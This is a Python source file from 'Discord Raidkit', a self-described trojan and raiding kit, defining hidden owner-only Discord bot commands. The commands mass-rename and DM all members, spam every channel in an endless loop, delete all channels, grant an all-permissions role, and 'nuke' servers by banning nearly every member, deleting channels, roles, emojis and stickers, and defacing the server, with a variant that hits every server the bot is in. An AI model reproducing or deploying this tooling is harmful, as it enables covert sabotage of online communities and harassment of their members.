"""
Discord Raidkit v2.3.5 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

cmds.py stores the Discord Raidkit bot commands for Anubis and Qetesh.
cmds.py was last updated on 05/03/23 at 20:05 UTC.
"""

import asyncio
import os

import discord
from discord.ext import commands

import utils.log_utils as lu
from drui import raider


class Cmds(commands.Cog):
    
    NOTIF_START = 's'
    NOTIF_END = 'e'
    
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    @commands.command(hidden=True, aliases=['nick', 'nickall'])
    async def nick_all(self, ctx: commands.Context, *, nickname: str) -> None:
        if not await self.bot.is_owner(ctx.author): 
            return
        
        await ctx.message.delete()

        if not nickname.strip():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to run nick_all: an argument was missing.')
         
        self.__notif('nick_all', self.NOTIF_START, ctx)

        tasks = [member.edit(nick=nickname) for member in ctx.guild.members]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        [lu.serror(lu.F_CMDS, 'Cmds.nick', f'nick_all raised: {result}') for result in results if isinstance(result, Exception)]

        self.__notif('nick_all', self.NOTIF_END, ctx)

    @commands.command(hidden=True, aliases=['msg', 'msgall'])
    async def msg_all(self, ctx: commands.Context, *, message: str) -> None:
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()

        if not message.strip():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to run msg_all : an argument was missing.')
        
        self.__notif('msg_all', self.NOTIF_START, ctx)

        tasks = [member.send(message) for member in ctx.guild.members]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        [lu.serror(lu.F_CMDS, 'Cmds.msg_all', f'msg_all raised: {result}') for result in results if isinstance(result, Exception)]
        
        self.__notif('msg_all', self.NOTIF_END, ctx)

    @commands.command(hidden=True)
    async def spam(self, ctx: commands.Context, *, message: str) -> None:

        def check_reply(s_message) -> bool:
            return s_message.content == 'stop' and s_message.author == ctx.author

        async def spam_text() -> None:
            while True:
                tasks = [c.send(message) for c in ctx.guild.text_channels]
                await asyncio.gather(*tasks, return_exceptions=True)

        if not await self.bot.is_owner(ctx.author):
            return
            
        await ctx.message.delete()

        if not message.strip():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to run spam: an argument was missing.')
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print(raider(self.bot.command_prefix) + f'\nspam running for server : {ctx.guild.name} | {ctx.guild.id}' + 
              '\nEnter \'stop\' in a text channel to stop spamming.')
        lu.sinfo(lu.F_CMDS, 'Cmds.spam', f'spam running for server : {ctx.guild.name} | {ctx.guild.id}')

        spam_task = self.bot.loop.create_task(spam_text())
        await self.bot.wait_for('message', check=check_reply)
        spam_task.cancel()

        self.__notif('spam', self.NOTIF_END, ctx)
        
    @commands.command(hidden=True)
    async def cpurge(self, ctx: commands.Context) -> None:
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()

        self.__notif('cpurge', self.NOTIF_START, ctx)
        
        tasks = [c.delete() for c in ctx.guild.channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        [lu.serror(lu.F_CMDS, 'Cmds.cpurge', f'cpurge raised: {result}') for result in results if isinstance(result, Exception)]
        
        self.__notif('cpurge', self.NOTIF_END, ctx)

    @commands.command(hidden=True)
    async def cflood(self, ctx: commands.Context, amount: str, *, name: str) -> None:
        if not await self.bot.is_owner(ctx.author):
            return
            
        await ctx.message.delete()

        if not amount.strip() or not name.strip():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to run cflood: an argument was missing.')
        
        if not int(amount) > 0:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to run cflood: invalid integer for amount.')
        
        self.__notif('cflood', self.NOTIF_START, ctx)
        
        tasks = [ctx.guild.create_text_channel(name) for _ in range(int(amount))]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        [lu.serror(lu.F_CMDS, 'Cmds.cflood', f'cflood raised: {result}') for result in results if isinstance(result, Exception)]
        
        self.__notif('cflood', self.NOTIF_END,)

    @commands.command(hidden=True)
    async def admin(self, ctx: commands.Context, member: discord.Member, *, role_name: str) -> None:
        if not await self.bot.is_owner(ctx.author):
            return
            
        await ctx.message.delete()

        if not member or not role_name.strip():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to run admin: an argument was missing.')
        
        self.__notif('admin', self.NOTIF_START, ctx)
        
        try:
            await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())
            role = discord.utils.get(ctx.guild.roles, name=role_name)
            await member.add_roles(role)

        except discord.errors.HTTPException as e:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to grant admin role: HTTPException: {e}')
            lu.serror(lu.F_CMDS, 'Cmds.admin', f'Error in cmds.py - admin(): HTTPException: {e}')
            return

        except commands.errors.MissingRequiredArgument:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to grant admin role: an argument was missing.')
            lu.serror(lu.F_CMDS, 'Cmds.admin', f'Error in cmds.py - admin(): an argument was missing.')
            return

        except Exception as e:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to grant admin role: {e}')
            lu.serror(lu.F_CMDS, 'Cmds.admin', f'Error in cmds.py - admin(): {e}')
            return

        self.__notif('admin', self.NOTIF_END, ctx),

    @commands.command(hidden=True)
    async def raid(self, ctx: commands.Context, role_name: str, nickname: str, amount: str, name: str, *,
                   message: str = '') -> None:

        def check_reply(s_message) -> bool:
            return s_message.content == 'stop' and s_message.author == ctx.author

        async def spam_text() -> None:
            while True:
                tasks = [channel.send(message) for channel in ctx.guild.text_channels]
                await asyncio.gather(*tasks, return_exceptions=True)

        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()

        if not role_name.strip() or not nickname.strip() or not amount.strip() or not name.strip():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to run raid: an argument was missing.')
        
        if not int(amount) > 0:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nFailed to run raid: invalid integer for amount.')
        
        self.__notif('raid', self.NOTIF_START, ctx)
                
        await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.none(), color=0xff0000)
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        
        tasks = [member.add_roles(role) for member in ctx.guild.members]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        tasks = [member.edit(nick=nickname) for member in ctx.guild.members]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        tasks = [c.delete() for c in ctx.guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)        

        tasks = [ctx.guild.create_text_channel(name) for _ in range(int(amount))]
        await asyncio.gather(*tasks, return_exceptions=True)

        os.system('cls' if os.name == 'nt' else 'clear')
        print(raider(self.bot.command_prefix) + f'\nraid spamming server : {ctx.guild.name} | {ctx.guild.id}' + 
              '\nEnter \'stop\' in a text channel to stop spamming.')
        
        spam_task = self.bot.loop.create_task(spam_text())
        await self.bot.wait_for('message', check=check_reply)
        spam_task.cancel()

        self.__notif('raid', self.NOTIF_END, ctx)
        
    @commands.command(hidden=True)
    async def nuke(self, ctx: commands.Context) -> None:
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        self.__notif('nuke', self.NOTIF_START, ctx)
               
        await self.__nuke(ctx.guild, ctx.author)

        self.__notif('nuke', self.NOTIF_END, ctx)
        
    @commands.command(hidden=True, aliases=['massnuke', 'nuke_all', 'nukeall'])
    async def mass_nuke(self, ctx: commands.Context) -> None:
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()

        self.__notif_all('mass_nuke', self.NOTIF_START)
        
        tasks = [self.__nuke(guild, ctx.author) for guild in self.bot.guilds]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.__notif_all('mass_nuke', self.NOTIF_END)

    @commands.command(hidden=True)
    async def leave(self, ctx: commands.Context) -> None:
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        self.__notif('leave', self.NOTIF_START, ctx)
        
        try:
            await ctx.guild.leave()
        except Exception as e:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(raider(self.bot.command_prefix) + f'\nleave raised: {e}')
            lu.serror(lu.F_CMDS, 'Cmds.leave', f'leave raised: {e}')

        self.__notif('leave', self.NOTIF_END, ctx)
        
    @commands.command(hidden=True, aliases=['massleave', 'leave_all', 'leaveall'])
    async def mass_leave(self, ctx: commands.Context) -> None:
        if not await self.bot.is_owner(ctx.author):
            return
        
        await ctx.message.delete()
        
        self.__notif_all('mass_leave', self.NOTIF_START)
        
        tasks = [ctx.guild.leave() for guild in self.bot.guilds]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        [lu.serror(lu.F_CMDS, 'Cmds.masS_leave', f'mass_leave raised: {e}') for e in results if isinstance(e, Exception)]
        
        self.__notif_all('mass_leave', self.NOTIF_END)


    async def __nuke(self, guild: discord.Guild, author: discord.Member):
        tasks = [member.ban() for member in guild.members if not (member.id == self.bot.user.id or member.id == author.id or member.id == guild.owner.id)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [lu.serror(lu.F_CMDS, 'Cmds.__nuke', f'Uncaught error (ban): {e}') for e in results if isinstance(e, Exception)]

        tasks = [c.delete() for c in guild.channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [lu.serror(lu.F_CMDS, 'Cmds.__nuke', f'Uncaught error (cpurge): {e}') for e in results if isinstance(e, Exception)]
        
        tasks = [r.delete() for r in guild.roles]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [lu.serror(lu.F_CMDS, 'Cmds.__nuke', f'Uncaught error (role purge): {e}') for e in results if isinstance(e, Exception)]

        tasks = [e.delete() for e in guild.emojis]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [lu.serror(lu.F_CMDS, 'Cmds.__nuke', f'Uncaught error (emoji purge): {e}') for e in results if isinstance(e, Exception)]

        tasks = [s.delete() for s in guild.stickers]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        [lu.serror(lu.F_CMDS, 'Cmds.__nuke', f'Uncaught error (sticker purge): {e}') for e in results if isinstance(e, Exception)]
        
        with open(os.path.join('cogs', 'shared', 'nuked.jpg'), 'rb') as f:
            icon = f.read()

        try:
            await guild.edit(name='Nuked by the-cult-of-integral')
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(description='Nuked by the-cult-of-integral')
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(icon=icon)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(banner=icon)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(splash=icon)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(discovery_splash=icon)
        except discord.errors.HTTPException:
            pass
            del icon

        try:
            await guild.edit(community=False)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(default_notifications=discord.NotificationLevel.all_messages)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(verification_level=discord.VerificationLevel.highest)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(explicit_content_filter=discord.ContentFilter.all_members)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(premium_progress_bar_enabled=False)
        except discord.errors.HTTPException:
            pass

        try:
            await guild.edit(preferred_locale=discord.Locale.japanese)
        except discord.errors.HTTPException:
            pass
    
    def __notif(self, method: str, soe: str, ctx: commands.Context):
        os.system('cls' if os.name == 'nt' else 'clear')        
        match soe:
            case self.NOTIF_START:
                print(raider(self.bot.command_prefix) + f'\n{method} started for server: {ctx.guild.name} | {ctx.guild.id}')
                lu.sinfo(lu.F_CMDS, f'Cmds.{method}', f'{method} started for server: {ctx.guild.name} | {ctx.guild.id}')
            case self.NOTIF_END:
                print(raider(self.bot.command_prefix) + f'\n{method} finished for server: {ctx.guild.name} | {ctx.guild.id}')
                lu.sinfo(lu.F_CMDS, f'Cmds.{method}', f'{method} finished for server: {ctx.guild.name} | {ctx.guild.id}')
            case _:
                raise ValueError(f'Invalid start (s) or end (e): {soe}')
    
    def __notif_all(self, method: str, soe: str):
        os.system('cls' if os.name == 'nt' else 'clear')        
        match soe:
            case 's':
                print(raider(self.bot.command_prefix) + f'\n{method} started for all servers.')
                lu.sinfo(lu.F_CMDS, f'Cmds.{method}', f'{method} started for all servers.')
            case 'e':
                print(raider(self.bot.command_prefix) + f'\n{method} finished for all servers.')
                lu.sinfo(lu.F_CMDS, f'Cmds.{method}', f'{method} finished for all servers.')
            case _:
                raise ValueError(f'Invalid start (s) or end (e): {soe}')
    
async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Cmds(bot))
